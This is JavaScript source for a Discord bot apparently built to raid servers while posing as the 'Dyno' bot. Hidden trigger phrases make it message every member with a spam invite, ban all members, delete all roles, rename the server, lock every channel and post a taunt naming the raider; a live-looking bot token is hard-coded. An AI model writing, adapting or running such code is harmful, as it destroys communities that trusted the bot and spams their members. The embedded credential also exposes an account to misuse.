////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const express = require('express');

const Discord = require('discord.js');
const berke = new Discord.Client();
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get('http://dyno-raid.glitch.me/');
    }, 280000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('message', msg => {
  if (msg.content === 'sadeceberke') {
    msg.delete()
    msg.guild.members.forEach(member => member.send("sohbet v.s sunucusu için discord.gg/K4Nkfse")
  )}
})

berke.on('message', async msg => {
  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
    msg.guild.members.forEach(member => member.ban())
    msg.guild.roles.deleteAll();
    msg.guild.setName("BERKE ADAMDIR");
    msg.guild.setIcon("https://media.discordapp.net/attachments/600251870836948993/623176047994732544/download.png");
    msg.guild.createChannel("dyno");
    msg.guild.createChannel("youtube");
    msg.guild.createChannel("lyrics-hazretleri");
  }
});
 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'dyno') {
    channel.send('Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; ``🏆 Chêrry.#0345``')
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjQyNzEzODUyMjQwMTk5Njkw.Xcw9Ag.MJ_aD-IA3gWPMMSYZgfyqlJ7pvQ");


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////